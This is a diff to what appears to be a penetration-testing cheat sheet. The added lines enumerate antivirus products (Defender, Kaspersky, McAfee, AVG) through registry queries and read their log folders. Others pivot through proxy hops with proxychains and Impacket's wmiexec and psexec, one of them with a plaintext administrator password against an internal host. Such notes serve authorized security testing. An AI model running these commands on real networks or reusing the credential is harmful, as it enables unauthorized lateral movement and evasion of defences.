@@ -89,9 +89,16 @@ reg query hklm\software && reg query hklm\software\wow6432node	#version, check t
 reg query 'hklm\software\microsoft\windows\currentversion\uninstall'
 reg query 'HKLM\software\microsoft\windows\currentversion\uninstall\############'
 
-reg query							#Primary registry key
+reg query "hklm\software\microsoft\windows defender"			#Primary registry key
+reg query "hklm\software\kaspersky lab"
+reg query "hklm\software\mcafee\system core"
+reg query "hklm\software\wow6432node\avg"
+
 reg query							#Installation folder
-reg query							#Directory location of logs
+dir "c:\programdata\kaspersky lab"							#Directory location of logs
+dir "c:\programdata\mcafee/mclogs"
+type "C:\windows\temp\mpcmdrun.log
+
 dir								#Timestamp of all log files
 reg query							#Cloud based?; yes or no
 dir								#Can we read the logs?; yes or no
@@ -129,7 +136,7 @@ OR
 
 ssh root@hop1 -D 9050 
 proxychains wmiexec.py user:'password'@hop2 ip
-
+/usr/share/doc/python-impacket/examples/psexec.py starwars/administrator:'PASSword12!@2017'@10.10.100.77
 
 #################### REDIRECT VIA NETSH ####################
 modprobe dummy
